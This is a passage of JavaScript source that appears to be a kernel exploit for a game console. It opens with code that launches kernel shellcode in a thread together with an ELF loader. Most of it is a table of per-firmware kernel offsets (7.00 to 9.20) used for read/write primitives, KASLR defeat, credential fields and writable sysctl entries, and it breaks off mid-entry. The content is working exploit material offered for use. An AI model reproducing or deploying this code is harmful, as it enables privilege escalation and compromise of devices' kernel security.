            write32(args + 0x04n, BigInt(master_pipe[1]));
            write32(args + 0x08n, BigInt(victim_pipe[0]));
            write32(args + 0x0cn, BigInt(victim_pipe[1]));
            write64(args + 0x10n, kernel_ptr("allproc", allproc));
            write64(args + 0x18n, elfldr_va);
            write64(args + 0x20n, BigInt(elfldr_data.length));
            const thr_handle = native_ptr("thread handle", mmap_rw(8));
            const thr_result = native_ptr("thread result", mmap_rw(8));
            write64(thr_handle, 0n);
            write64(thr_result, 0n);
            await asay("handoff 4/6: args @ 0x" + args.toString(16) +
                " allproc 0x" + BigInt(allproc).toString(16) + " master " +
                master_pipe.join("/") + " victim " + victim_pipe.join("/"));
            await asay("handoff 5/6: Thrd_create(entry=0x" + entry.toString(16) +
                ", args=0x" + args.toString(16) + ")");
            const created = call(Thrd_create, thr_handle, entry, args);
            if (created !== 0n) fatal("Thrd_create failed: " + toHex(created));
            const tid = read64(thr_handle);
            await asay("handoff 6/6: thread " + tid.toString(10) +
                " running, joining...");
            const joined = call(Thrd_join, tid, thr_result);
            if (joined !== 0n) fatal("Thrd_join failed: " + toHex(joined));
            await asay("kexp shellcode returned " + toHex(read64(thr_result)));
            return true;
        }
        const KRW_TABLE = {
            "7.00": {
                firmware: "7.00",
                security_flags: 0x1718064,
                kernelData: 0xc50000,
                allproc: 0x34a9d50,
                rootvnode: 0x3d17510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa83731,
                    retLow16: 0x3731,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27706c8,
                        kind: 0x27706dc,
                        kindByte3: 0x27706df,
                        arg1: 0x27706e0,
                        arg1Byte1: 0x27706e1,
                        arg1Value: 0x27706b8,
                        deadSink: 0x27706e8,
                    },
                    b: {
                        base: 0x27705a0,
                        kind: 0x27705b4,
                        kindByte3: 0x27705b7,
                        arg1: 0x27705b8,
                        arg1Value: 0x27704d0,
                        visible: 0x27705f0,
                    },
                    c: {
                        base: 0x2a92fa8,
                        kind: 0x2a92fbc,
                        arg1: 0x2a92fc0,
                        arg1Value: 0x3c93f3c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3c93f38,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a6fe18,
                rodataProbe: {
                    rva: 0x1010a7a,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "7.01": {
                firmware: "7.01",
                security_flags: 0x1718064,
                kernelData: 0xc50000,
                allproc: 0x34a9d50,
                rootvnode: 0x3d17510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa83731,
                    retLow16: 0x3731,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27706c8,
                        kind: 0x27706dc,
                        kindByte3: 0x27706df,
                        arg1: 0x27706e0,
                        arg1Byte1: 0x27706e1,
                        arg1Value: 0x27706b8,
                        deadSink: 0x27706e8,
                    },
                    b: {
                        base: 0x27705a0,
                        kind: 0x27705b4,
                        kindByte3: 0x27705b7,
                        arg1: 0x27705b8,
                        arg1Value: 0x27704d0,
                        visible: 0x27705f0,
                    },
                    c: {
                        base: 0x2a92fa8,
                        kind: 0x2a92fbc,
                        arg1: 0x2a92fc0,
                        arg1Value: 0x3c93f3c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3c93f38,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a6fe18,
                rodataProbe: {
                    rva: 0x1010fa2,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "7.20": {
                firmware: "7.20",
                security_flags: 0x1718064,
                kernelData: 0xc50000,
                allproc: 0x34a9d50,
                rootvnode: 0x3d17510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa83b81,
                    retLow16: 0x3b81,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2770788,
                        kind: 0x277079c,
                        kindByte3: 0x277079f,
                        arg1: 0x27707a0,
                        arg1Byte1: 0x27707a1,
                        arg1Value: 0x2770778,
                        deadSink: 0x27707a8,
                    },
                    b: {
                        base: 0x2770660,
                        kind: 0x2770674,
                        kindByte3: 0x2770677,
                        arg1: 0x2770678,
                        arg1Value: 0x2770590,
                        visible: 0x27706b0,
                    },
                    c: {
                        base: 0x2a93068,
                        kind: 0x2a9307c,
                        arg1: 0x2a93080,
                        arg1Value: 0x3c93f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3c93f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a6fed8,
                rodataProbe: {
                    rva: 0x1010b71,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "7.40": {
                firmware: "7.40",
                security_flags: 0x1718064,
                kernelData: 0xc50000,
                allproc: 0x34a9d50,
                rootvnode: 0x3d17510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa83b81,
                    retLow16: 0x3b81,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2770788,
                        kind: 0x277079c,
                        kindByte3: 0x277079f,
                        arg1: 0x27707a0,
                        arg1Byte1: 0x27707a1,
                        arg1Value: 0x2770778,
                        deadSink: 0x27707a8,
                    },
                    b: {
                        base: 0x2770660,
                        kind: 0x2770674,
                        kindByte3: 0x2770677,
                        arg1: 0x2770678,
                        arg1Value: 0x2770590,
                        visible: 0x27706b0,
                    },
                    c: {
                        base: 0x2a93068,
                        kind: 0x2a9307c,
                        arg1: 0x2a93080,
                        arg1Value: 0x3c93f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3c93f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a6fed8,
                rodataProbe: {
                    rva: 0x10110b6,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "7.60": {
                firmware: "7.60",
                security_flags: 0x1718064,
                kernelData: 0xc50000,
                allproc: 0x34a9d50,
                rootvnode: 0x3d17510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa84191,
                    retLow16: 0x4191,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2770808,
                        kind: 0x277081c,
                        kindByte3: 0x277081f,
                        arg1: 0x2770820,
                        arg1Byte1: 0x2770821,
                        arg1Value: 0x27707f8,
                        deadSink: 0x2770828,
                    },
                    b: {
                        base: 0x27706e0,
                        kind: 0x27706f4,
                        kindByte3: 0x27706f7,
                        arg1: 0x27706f8,
                        arg1Value: 0x2770610,
                        visible: 0x2770730,
                    },
                    c: {
                        base: 0x2a930e8,
                        kind: 0x2a930fc,
                        arg1: 0x2a93100,
                        arg1Value: 0x3c93f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3c93f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a6fed8,
                rodataProbe: {
                    rva: 0x1010bca,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "7.61": {
                firmware: "7.61",
                security_flags: 0x1718064,
                kernelData: 0xc50000,
                allproc: 0x34a9d50,
                rootvnode: 0x3d17510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa84191,
                    retLow16: 0x4191,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2770808,
                        kind: 0x277081c,
                        kindByte3: 0x277081f,
                        arg1: 0x2770820,
                        arg1Byte1: 0x2770821,
                        arg1Value: 0x27707f8,
                        deadSink: 0x2770828,
                    },
                    b: {
                        base: 0x27706e0,
                        kind: 0x27706f4,
                        kindByte3: 0x27706f7,
                        arg1: 0x27706f8,
                        arg1Value: 0x2770610,
                        visible: 0x2770730,
                    },
                    c: {
                        base: 0x2a930e8,
                        kind: 0x2a930fc,
                        arg1: 0x2a93100,
                        arg1Value: 0x3c93f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3c93f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a6fed8,
                rodataProbe: {
                    rva: 0x101114f,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "8.00": {
                firmware: "8.00",
                security_flags: 0x1733064,
                kernelData: 0xc70000,
                allproc: 0x34e5d50,
                rootvnode: 0x3d6b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa9cac5,
                    retLow16: 0xcac5,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27914e8,
                        kind: 0x27914fc,
                        kindByte3: 0x27914ff,
                        arg1: 0x2791500,
                        arg1Byte1: 0x2791501,
                        arg1Value: 0x27914d8,
                        deadSink: 0x2791508,
                    },
                    b: {
                        base: 0x27913c0,
                        kind: 0x27913d4,
                        kindByte3: 0x27913d7,
                        arg1: 0x27913d8,
                        arg1Value: 0x27912f0,
                        visible: 0x2791410,
                    },
                    c: {
                        base: 0x2ab3dc8,
                        kind: 0x2ab3ddc,
                        arg1: 0x2ab3de0,
                        arg1Value: 0x3ce7f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3ce7f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8ff48,
                rodataProbe: {
                    rva: 0x10254e9,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "8.20": {
                firmware: "8.20",
                security_flags: 0x1733064,
                kernelData: 0xc70000,
                allproc: 0x34e5d50,
                rootvnode: 0x3d6b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa9dec5,
                    retLow16: 0xdec5,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27913a8,
                        kind: 0x27913bc,
                        kindByte3: 0x27913bf,
                        arg1: 0x27913c0,
                        arg1Byte1: 0x27913c1,
                        arg1Value: 0x2791398,
                        deadSink: 0x27913c8,
                    },
                    b: {
                        base: 0x2791280,
                        kind: 0x2791294,
                        kindByte3: 0x2791297,
                        arg1: 0x2791298,
                        arg1Value: 0x27911b0,
                        visible: 0x27912d0,
                    },
                    c: {
                        base: 0x2ab3c88,
                        kind: 0x2ab3c9c,
                        arg1: 0x2ab3ca0,
                        arg1Value: 0x3ce7f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3ce7f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8ff48,
                rodataProbe: {
                    rva: 0x102527f,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "8.40": {
                firmware: "8.40",
                security_flags: 0x1733064,
                kernelData: 0xc70000,
                allproc: 0x34e5d50,
                rootvnode: 0x3d6b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa9e155,
                    retLow16: 0xe155,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27913a8,
                        kind: 0x27913bc,
                        kindByte3: 0x27913bf,
                        arg1: 0x27913c0,
                        arg1Byte1: 0x27913c1,
                        arg1Value: 0x2791398,
                        deadSink: 0x27913c8,
                    },
                    b: {
                        base: 0x2791280,
                        kind: 0x2791294,
                        kindByte3: 0x2791297,
                        arg1: 0x2791298,
                        arg1Value: 0x27911b0,
                        visible: 0x27912d0,
                    },
                    c: {
                        base: 0x2ab3c88,
                        kind: 0x2ab3c9c,
                        arg1: 0x2ab3ca0,
                        arg1Value: 0x3ce7f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3ce7f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8ff48,
                rodataProbe: {
                    rva: 0x1024d9f,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "8.60": {
                firmware: "8.60",
                security_flags: 0x1733064,
                kernelData: 0xc70000,
                allproc: 0x34e5d50,
                rootvnode: 0x3d6b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xa9e3d5,
                    retLow16: 0xe3d5,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x27913a8,
                        kind: 0x27913bc,
                        kindByte3: 0x27913bf,
                        arg1: 0x27913c0,
                        arg1Byte1: 0x27913c1,
                        arg1Value: 0x2791398,
                        deadSink: 0x27913c8,
                    },
                    b: {
                        base: 0x2791280,
                        kind: 0x2791294,
                        kindByte3: 0x2791297,
                        arg1: 0x2791298,
                        arg1Value: 0x27911b0,
                        visible: 0x27912d0,
                    },
                    c: {
                        base: 0x2ab3c88,
                        kind: 0x2ab3c9c,
                        arg1: 0x2ab3ca0,
                        arg1Value: 0x3ce7f7c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3ce7f78,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a8ff48,
                rodataProbe: {
                    rva: 0x102534f,
                    text: "_aio_submit_cmd",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "9.00": {
                firmware: "9.00",
                security_flags: 0x1a12064,
                kernelData: 0xca0000,
                allproc: 0x33f5d50,
                rootvnode: 0x3c7b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xac1451,
                    retLow16: 0x1451,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2787ab8,
                        kind: 0x2787acc,
                        kindByte3: 0x2787acf,
                        arg1: 0x2787ad0,
                        arg1Byte1: 0x2787ad1,
                        arg1Value: 0x2787aa8,
                        deadSink: 0x2787ad8,
                    },
                    b: {
                        base: 0x2787990,
                        kind: 0x27879a4,
                        kindByte3: 0x27879a7,
                        arg1: 0x27879a8,
                        arg1Value: 0x27878c0,
                        visible: 0x27879e0,
                    },
                    c: {
                        base: 0x2aaa678,
                        kind: 0x2aaa68c,
                        arg1: 0x2aaa690,
                        arg1Value: 0x3bf8f3c,
                        mib: [0x9, 0x8],
                    },
                },
                walkCounter: {
                    addr: 0x3bf8f38,
                    mib: [0x9, 0x7],
                },
                nodeMutex: 0x1a588e8,
                rodataProbe: {
                    rva: 0x110791a,
                    text: "_aio_submit_cmd\u0000_aio_multi_wait",
                },
                aio: {
                    waiterSize: 0x38,
                    requestSize: 0x28,
                    group: {
                        num: 0x0,
                        state: 0x8,
                        waiters: 0x50,
                    },
                    idTable: {
                        pages: 0x220,
                        slotStride: 0x30,
                        entryType: 0x160,
                    },
                },
                proc: {
                    pid: 0xbc,
                    ucred: 0x40,
                    fd: 0x48,
                    aioInfo: 0xc38,
                    dynlib: 0x3e8,
                },
                kernelPid: 0x0,
                ucred: {
                    uid: 0x4,
                    ruid: 0x8,
                    svuid: 0xc,
                    ngroups: 0x10,
                    rgid: 0x14,
                    svgid: 0x18,
                    sceAuthId: 0x58,
                    sceCaps: 0x60,
                    sceCaps1: 0x68,
                    sceAttrs: 0x80,
                },
                sysCoreAuthId: {
                    lo: 0x7,
                    hi: 0x48000000,
                },
                filedesc: {
                    files: 0x0,
                    cdir: 0x8,
                    rdir: 0x10,
                    jdir: 0x18,
                },
                filedescTable: {
                    nfiles: 0x0,
                    ofiles: 0x8,
                    entryStride: 0x30,
                    fileData: 0x0,
                },
                pipe: {
                    count: 0x0,
                    in: 0x4,
                    out: 0x8,
                    size: 0xc,
                    buffer: 0x10,
                    pair: 0xe8,
                    defaultSize: 0x4000,
                },
                dynlib: {
                    syscallStart: 0xf0,
                    syscallEnd: 0xf8,
                    restrictFlags: 0x118,
                    libkernelRef: 0x18,
                },
            },
            "9.20": {
                firmware: "9.20",
                security_flags: 0x1a13064,
                kernelData: 0xca0000,
                allproc: 0x33f5d50,
                rootvnode: 0x3c7b510,
                kaslr: {
                    mode: "rtmsg2",
                    retStatic: 0xac1471,
                    retLow16: 0x1471,
                },
                oid: {
                    originalKind: 0x80048002,
                    writableKind: 0x70048002,
                    a: {
                        base: 0x2787ab8,
                        kind: 0x2787acc,
                        kindByte3: 0x2787acf,
                        arg1: 0x2787ad0,
                        arg1Byte1: 0x2787ad1,
                        arg1Value: 0x2787aa8,
                        deadSink: 0x2787ad8,
                    },
                    b: {
                        base: 0x2787990,
                        kind: 0x27879a4,
                        kindByte3: 0x27879a7,
                        arg1: 0x27879a8,
                        arg1Value: 0x27878c0,
                        visible: 0x27879e0,
                    },
                    c: {
                        base: 0x2aaa678,
                        kind: 0x2aaa68c,
                        arg1: 0x2aaa690,
